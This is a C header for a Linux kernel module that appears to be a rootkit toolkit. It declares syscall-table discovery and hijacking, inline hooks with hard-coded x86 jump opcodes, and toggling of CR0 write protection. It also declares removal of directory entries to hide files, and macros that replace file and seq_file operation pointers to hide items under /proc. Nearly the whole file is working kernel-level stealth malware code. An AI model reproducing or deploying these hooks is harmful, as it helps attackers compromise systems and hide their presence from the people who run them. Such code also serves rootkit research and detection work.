#ifndef _R0MOD_GLOBAL_H
#   define _R0MOD_GLOBAL_H

#   ifndef CPP
#       include <linux/module.h>
#       include <linux/fs.h>        // filp_open, filp_close.
#       include <linux/proc_fs.h>   // PDE_DATA.
#       include <linux/seq_file.h>  // struct seq_file, struct seq_operations.
#       include <linux/printk.h>    // printk.
#       include <linux/dirent.h>    // struct linux_dirent64
#   endif

#   include "structs.h"

// Syscall table or dispatcher
unsigned long **get_sct(void);

unsigned long **get_sct_via_sys_close(void);

void *get_lstar_sct_addr(void);

unsigned long **get_lstar_sct(void);

int set_lstar_sct(u32 address);

void *phys_to_virt_kern(phys_addr_t address);

// Inline hooking
#   if defined(__x86_64__)
#       define BYTES "\x48\xb8\x88\x77\x66\x55\x44\x33\x22\x11\xff\xe0"
#       define DELTA 2
#   elif defined(__i386__)
#       define BYTES "\x68\x44\x33\x22\x11\xc3"
#       define DELTA 1
#   else
#       error "Unsupported Arch!"
#   endif

#   define HOOKED_SIZE (sizeof(BYTES) - 1)

struct hooked_item
{
    void *real_addr;
    unsigned char real_opcode[HOOKED_SIZE];
    unsigned char fake_opcode[HOOKED_SIZE];
    struct list_head list;
};

void install_inline_hook(void *real_addr, void *fake_addr);

void pause_inline_hook(void *real_addr);

void resume_inline_hook(void *real_addr);

void remove_inline_hook(void *real_addr);

// Write protection
void disable_wp(void);

void enable_wp(void);

// Helper Information printers
void print_process_list(void);

void print_module_list(void);

// Process linux_dirent cases
void print_dents(struct linux_dirent *dirp, long total);

void print_dents64(struct linux_dirent64 *dirp, long total);

long remove_dent(char *name, struct linux_dirent *dirp, long total);

long remove_dent64(char *name, struct linux_dirent64 *dirp, long total);

// Misc helpers
char *join_strings(const char *const *strings, const char *delim,
    char *buff, size_t count);

void print_memory(void *addr, size_t count, const char *prompt);

void print_ascii(void *addr, size_t count, const char *prompt);

// Logging helpers
// INFO: ``fn`` is short for ``__func__``.
#   define fn_printk(level, fmt, ...)                               \
        printk(level "%s: " fmt, __func__, ##__VA_ARGS__)

// INFO: ``fm`` is short for ``__func__`` and ``module``.
#   define fm_printk(level, fmt, ...)                               \
        printk(level "%s.%s: " fmt,                                 \
            THIS_MODULE->name, __func__, ##__VA_ARGS__)

// INFO: I only use ``pr_alert`` at present.
#   define fn_alert(fmt, ...)                                       \
        fn_printk(KERN_ALERT, fmt, ##__VA_ARGS__)

#   define fm_alert(fmt, ...)                                       \
        fm_printk(KERN_ALERT, fmt, ##__VA_ARGS__)

// Syscall table hooking helpers
#   define HOOK_SCT(sct, name)                                      \
        do {                                                        \
            real_##name = (void *)sct[__NR_##name];                 \
            sct[__NR_##name] = (void *)fake_##name;                 \
        } while (0)

#   define UNHOOK_SCT(sct, name)                                    \
        sct[__NR_##name] = (void *)real_##name

// File : file_op and a like hooking helpers
#   define set_file_op(op, path, new, old)                          \
    do {                                                            \
        struct file *filp;                                          \
        struct file_operations *f_op;                               \
                                                                    \
        fm_alert("Opening the path: %s.\n", path);                  \
        filp = filp_open(path, O_RDONLY, 0);                        \
        if (IS_ERR(filp)) {                                         \
            fm_alert("Failed to open %s with error %ld.\n",         \
                     path, PTR_ERR(filp));                          \
            old = NULL;                                             \
        } else {                                                    \
            fm_alert("Succeeded in opening: %s\n", path);           \
            f_op = (struct file_operations *)filp->f_op;            \
            old = f_op->op;                                         \
                                                                    \
            fm_alert("Changing file_op->" #op " from %p to %p.\n",  \
                     old, new);                                     \
            disable_wp();                                           \
            f_op->op = new;                                         \
            enable_wp();                                            \
        }                                                           \
    } while (0)

#   define set_afinfo_seq_op(op, path, afinfo_struct, new, old)     \
    do {                                                            \
        struct file *filp;                                          \
        afinfo_struct *afinfo;                                      \
                                                                    \
        filp = filp_open(path, O_RDONLY, 0);                        \
        if (IS_ERR(filp)) {                                         \
            fm_alert("Failed to open %s with error %ld.\n",         \
                     path, PTR_ERR(filp));                          \
            old = NULL;                                             \
        } else {                                                    \
                                                                    \
            afinfo = PDE_DATA(filp->f_path.dentry->d_inode);        \
            old = afinfo->seq_ops.op;                               \
            fm_alert("Setting seq_op->" #op " from %p to %p.",      \
                     old, new);                                     \
            afinfo->seq_ops.op = new;                               \
                                                                    \
            filp_close(filp, 0);                                    \
        }                                                           \
    } while (0)

#   define set_file_seq_op(opname, path, new, old)                  \
    do {                                                            \
        struct file *filp;                                          \
        struct seq_file *seq;                                       \
        struct seq_operations *seq_op;                              \
                                                                    \
        fm_alert("Opening the path: %s.\n", path);                  \
        filp = filp_open(path, O_RDONLY, 0);                        \
        if (IS_ERR(filp)) {                                         \
            fm_alert("Failed to open %s with error %ld.\n",         \
                     path, PTR_ERR(filp));                          \
            old = NULL;                                             \
        } else {                                                    \
            fm_alert("Succeeded in opening: %s\n", path);           \
            seq = (struct seq_file *)filp->private_data;            \
            seq_op = (struct seq_operations *)seq->op;              \
            old = seq_op->opname;                                   \
                                                                    \
            fm_alert("Changing seq_op->"#opname" from %p to %p.\n", \
                     old, new);                                     \
            disable_wp();                                           \
            seq_op->opname = new;                                   \
            enable_wp();                                            \
        }                                                           \
    } while (0)

#endif
